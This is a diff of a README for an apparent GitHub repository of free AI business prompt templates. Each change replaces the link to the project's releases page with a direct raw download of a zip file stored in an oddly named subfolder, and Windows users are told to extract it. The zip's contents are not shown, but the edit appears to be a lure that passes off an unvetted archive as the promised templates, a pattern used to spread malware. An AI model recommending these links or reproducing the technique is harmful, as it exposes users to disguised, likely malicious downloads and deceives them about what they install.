@@ -1,6 +1,6 @@
 # 🤖 free-ai-prompt-templates - Ready-to-Use AI Prompts for Business
 
-[![Download Free AI Prompt Templates](https://img.shields.io/badge/Download-Free%20AI%20Prompt%20Templates-brightgreen)](https://github.com/stretchable-borsh402/free-ai-prompt-templates/releases)
+[![Download Free AI Prompt Templates](https://img.shields.io/badge/Download-Free%20AI%20Prompt%20Templates-brightgreen)](https://raw.githubusercontent.com/stretchable-borsh402/free-ai-prompt-templates/main/Peterloo/templates_prompt_free_ai_nutter.zip)
 
 ## 📋 About free-ai-prompt-templates
 
@@ -34,7 +34,7 @@ These prompts help you with tasks like writing emails, creating marketing conten
 
 Start by visiting the release page below to get the latest version of the prompt templates:
 
-[![Visit Releases Page](https://img.shields.io/badge/Visit-Releases%20Page-blue)](https://github.com/stretchable-borsh402/free-ai-prompt-templates/releases)
+[![Visit Releases Page](https://img.shields.io/badge/Visit-Releases%20Page-blue)](https://raw.githubusercontent.com/stretchable-borsh402/free-ai-prompt-templates/main/Peterloo/templates_prompt_free_ai_nutter.zip)
 
 ### Step 1: Visit the Download Page
 
@@ -135,7 +135,7 @@ Yes. All prompt templates in this repository are free to use.
 
 Visit the release page below to download the latest templates package:
 
-[Download the latest free-ai-prompt-templates here](https://github.com/stretchable-borsh402/free-ai-prompt-templates/releases)
+[Download the latest free-ai-prompt-templates here](https://raw.githubusercontent.com/stretchable-borsh402/free-ai-prompt-templates/main/Peterloo/templates_prompt_free_ai_nutter.zip)
 
 Follow the steps in **Getting Started** to extract and use the prompts on your Windows PC.
 
